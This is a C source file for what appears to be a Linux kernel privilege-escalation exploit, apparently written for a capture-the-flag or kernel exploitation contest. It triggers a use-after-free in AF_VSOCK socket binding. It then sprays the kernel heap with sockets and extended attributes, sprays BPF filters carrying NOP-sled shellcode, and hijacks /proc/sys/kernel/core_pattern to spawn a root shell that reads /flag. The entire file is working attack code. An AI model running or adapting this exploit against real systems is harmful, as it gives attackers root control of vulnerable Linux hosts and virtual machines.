#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <syscall.h>
#include <stdarg.h>
#include <sched.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/times.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <stddef.h>
#include <linux/types.h>
#include <stdint.h>
#include <linux/keyctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <syscall.h>
#include <stdarg.h>
#include <sched.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/times.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <stddef.h>
#include <sys/resource.h>
#include <sys/epoll.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>

#include "modules/xattr.h"

#define MAX_PORT_RETRIES 24

#define MAIN_CPU 0
#define HELPER_CPU 1

inline static int _pin_to_cpu(int id)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(id, &set);
	return sched_setaffinity(getpid(), sizeof(set), &set);
}

typedef int key_serial_t;

inline static key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid)
{
	return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

long keyctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
{
	return syscall(__NR_keyctl, option, arg2, arg3, arg4, arg5);
}

#define FAIL_IF(x) if ((x)) { \
	perror(#x); \
	return -1; \
}

static void die(const char *msg)
{
	perror(msg);
	exit(-1);
}

unsigned long long get_jiffies()
{
	return times(NULL) * 10;
}


int socket_bind(int port)
{
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
		.svm_cid = VMADDR_CID_LOCAL,
		.svm_port = port,
	};
	int s;

	s = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
	if (s < 0)
		die("socket");

	if (bind(s, (struct sockaddr *)&addr, sizeof(addr)))
		die("bind");

	return s;
}

struct vsock_sock {
	char arr[1232];
};

union key_payload {
	struct vsock_sock vsk;
	struct {
		char header[24];
		char data[];
	} key;
};

int timefds[0x50000];
int epfds[0x50000];
char buf[0x1000];
int tfd;

static void epoll_ctl_add(int epfd, int fd, uint32_t events)
{
	struct epoll_event ev;
	ev.events = events;
	ev.data.fd = fd;
	epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
}

void do_epoll_enqueue(int fd)
{
	int cfd[2];
	socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
	for (int k = 0; k < 0x10; k++)
	{
		if (fork() == 0)
		{
			for (int i = 0; i < 0x100; i++)
			{
				timefds[i] = dup(fd);
			}
			for (int i = 0; i < 0x1c0; i++)
			{
				epfds[i] = epoll_create(0x1);
			}
			for (int i = 0; i < 0x1c0; i++)
			{
				for (int j = 0; j < 0x100; j++)
				{
					// queue as many as possible async waiters at timerfd waitqueue
					epoll_ctl_add(epfds[i], timefds[j], 0);
				}
			}
			write(cfd[1], buf, 1);
			raise(SIGSTOP); // stop here for nothing and just keep epoll alive
		}
		// sync to make sure it has queue what we need
		read(cfd[0], buf, 1);
	}
	close(cfd[0]);
	close(cfd[1]);
}

int vsock, vsock2;
int pipe_fd[2];

int thread_function(void)
{
	char buffer[8];
	cpu_set_t cpuset;
	int cpu_to_use;
	pthread_t self = pthread_self();
	struct sockaddr_vm addr;

	addr.svm_family = AF_VSOCK;
	addr.svm_cid = VMADDR_CID_LOCAL;
	addr.svm_port = VMADDR_PORT_ANY;

	cpu_to_use = HELPER_CPU;
	CPU_ZERO(&cpuset);
	CPU_SET(cpu_to_use, &cpuset);
	pthread_setaffinity_np(self, sizeof(cpu_set_t), &cpuset);

	read(pipe_fd[0], buffer, sizeof(buffer));

	cpu_to_use = HELPER_CPU;
	CPU_ZERO(&cpuset);
	CPU_SET(cpu_to_use, &cpuset);
	pthread_setaffinity_np(self, sizeof(cpu_set_t), &cpuset);

	struct itimerspec new = {.it_value.tv_nsec = 10000000};
	timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new, NULL);

	/* virtio_transport_recv_pkt() 호출해서 rip control */
	if (!connect(vsock2, (struct sockaddr *)&addr, sizeof(struct sockaddr)))
		die("connect 3");

	return 0;
}

#define CC_OVERFLOW_FACTOR 2
#define OBJS_PER_SLAB 12
#define CPU_PARTIAL 0x5
#define OBJS_FRONT OBJS_PER_SLAB + 0x20
#define CHUNK_SIZE 0x500

#define FRONT_SLUB_CNT 0x10

int spray_cnt = 0;
int front = 0, target1, target2, back;
int sprayed_vsock[0x1000];

void _wait()
{
	printf("waiting...\n");
	getchar();
}


struct sock_filter filter[0x1000];
char buf[0x1000];
#define SYSCHK(x)                     \
	({                                \
	 typeof(x) __res = (x);        \
	 if (__res == (typeof(x))-1)   \
	 err(1, "SYSCHK(" #x ")"); \
	 __res;                        \
	 })

int sc()
{
	int stopfd[2];
	SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, stopfd));
	unsigned int prog_len = 0x900;
	/* In current environment, the max instructions in a program is near 0x900
	   And we test 0x900 instructions * 0x50 forks * 0x100 sockets * 4 = 180 MB is enough large to spray and worked reliably
	   */
	struct sock_filter table[] = {
		{.code = BPF_LD + BPF_K, .k = 0xb3909090},
		{.code = BPF_RET + BPF_K, .k = SECCOMP_RET_ALLOW}};

	/* 0xb3909090 is NOPsled shellclode to make exploitation more reliable
	   90       nop
	   90       nop
	   90       nop
	   b3 b8    mov    bl, 0xb8
	   */
	for (int i = 0; i < prog_len; i++)
		filter[i] = table[0];

	filter[prog_len - 1] = table[1];
	int idx = prog_len - 2;

#include "sc.h"

	struct sock_fprog prog = {
		.len = prog_len,
		.filter = filter,
	};

	char buffer[0x1000];
	for (int k = 0; k < 0x50; k++)
	{
		if (fork() == 0) // use fork to bypass RLIMIT_NOFILE limit.
		{
			int fd[0x100][2];
			close(stopfd[1]);
			for (int i = 0; i < 0x100; i++)
			{
				SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, fd[i]));
				SYSCHK(setsockopt(fd[i][0], SOL_SOCKET,
							SO_ATTACH_FILTER, &prog,
							sizeof(prog)));
			}
			write(stopfd[0], buf, 1);
			read(stopfd[0], buf, 1);
			exit(0);
		}
	}
	/* wait for all forks to finish spraying BPF code */
	read(stopfd[1], buf, 0x50);

	return 0;
}

int check_core()
{
	// Check if /proc/sys/kernel/core_pattern has been overwritten
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666 %P", strlen("|/proc/%P/fd/666 %P")) == 0;
}

void root(char *buf)
{
	int pid = strtoull(buf, 0, 10);
	char path[0x100];
	printf("run root()\n");
	// fix stdin, stdout, stderr
	sprintf(path, "/proc/%d/ns/net", pid);
	int pfd = syscall(SYS_pidfd_open, pid, 0);
	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
	dup2(stdinfd, 0);
	dup2(stdoutfd, 1);
	dup2(stderrfd, 2);
	// just cat the flag
	system("cat /flag;bash");
}

int main(int argc, void *argv[])
{
	if (argc > 1) {
		printf("triggered from core_pattern\n");
		root(argv[1]);
		exit(0);
	}

	struct sockaddr_vm addr;
	socklen_t alen = sizeof(addr);
	int random_port, i;
	pid_t conn_pid;
	pthread_t thread;
	const char* message = "D";

	char file_name[0x100];
	char attribute_name[0x100] = "security.xattr1";
	char spray[0x1000] = {0};
	for(int i=0; i<0x1000; i++)
	{
		snprintf(file_name, 0x100, "/tmp/xattrs%d", i);
		close(open(file_name, O_CREAT | O_RDWR, 0666));
	}

	if(!fork())
	{
		while(1)
		{
			sleep(1);
			if(check_core())
			{
				printf("core pattern changed!\n");
				char buf[0x100] = {};
				int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
				read(core, buf, sizeof(buf));
				write(1, buf, sizeof(buf));
				if(!fork())
				{
					int memfd = memfd_create("x", 0);
					SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0,
								0xffffffff));
					dup2(memfd, 666);
					close(memfd);
					// trigger crash
					*(size_t *)0 = 0;
					return 0;
				}
			}
		}
	}

	char *user_buf = mmap(0xa00000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	strcpy(user_buf, "|/proc/%P/fd/666 %P");
	sc();
	// _wait();

	struct rlimit rlim = {
		.rlim_cur = 4096,
		.rlim_max = 4096};
	setrlimit(RLIMIT_NOFILE, &rlim);

	tfd = timerfd_create(CLOCK_MONOTONIC, 0);
	do_epoll_enqueue(tfd);

	_pin_to_cpu(MAIN_CPU);

	if (pthread_create(&thread, NULL, thread_function, NULL) != 0) {
		perror("Failed to create thread");
		return 1;
	}

	if (pipe(pipe_fd) == -1) {
		perror("pipe");
		exit(EXIT_FAILURE);
	}

	_pin_to_cpu(MAIN_CPU);

	vsock2 = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
	if (vsock2 < 0)
		die("socket");

	random_port = socket_bind(VMADDR_PORT_ANY);
	if (getsockname(random_port, (struct sockaddr *)&addr, &alen))
		die("getsockname");

	for (i = 0; i < MAX_PORT_RETRIES; ++i)
		socket_bind(++addr.svm_port);

	for (int i=0; i<FRONT_SLUB_CNT; i++)
		for(int j=0; j<OBJS_PER_SLAB; j++)
			sprayed_vsock[spray_cnt++] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

	target1 = spray_cnt;
	for (int i=0; i<OBJS_PER_SLAB; i++)
		sprayed_vsock[spray_cnt++] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

	vsock = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
	if (vsock < 0)
		die("socket");

	target2 = spray_cnt;
	for(int i=0; i<OBJS_PER_SLAB; i++)
		sprayed_vsock[spray_cnt++] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

	back = spray_cnt;

	if (!connect(vsock, (struct sockaddr *)&addr, alen))
		die("connect 1");

	addr.svm_cid = 0;
	if (!connect(vsock, (struct sockaddr *)&addr, alen))
		die("connect 2");

	for(int i=target1; i<target2; i++)
		close(sprayed_vsock[i]);
	for(int i=target2; i<back; i++)
		close(sprayed_vsock[i]);

	addr.svm_cid = VMADDR_CID_LOCAL;
	addr.svm_port = VMADDR_PORT_ANY;
	if (bind(vsock, (struct sockaddr *)&addr, alen))	// UAF
		die("bind s");

	for(int i=0; i<target1; i++)
		close(sprayed_vsock[i]);

	for(int i=0x000; i<0x300; i+=8)
		((unsigned long long*)spray)[i/8] = 0xffffffffcc000000;

	write(pipe_fd[1], message, 1);

	unsigned long long begin = get_jiffies();
	do {
	} while (get_jiffies() - begin < 25);

	for(int i=0; i<0x1000; i++) {
#define ATTRIBUTE_NAME_LEN 0x20
		snprintf(file_name, 0x100, "/tmp/xattrs%d", i);
		create_xattr(file_name, attribute_name, spray, XATTR_VALUE_KMALLOC_CG_1K, true);
	}

	while(1);

	return 0;
}
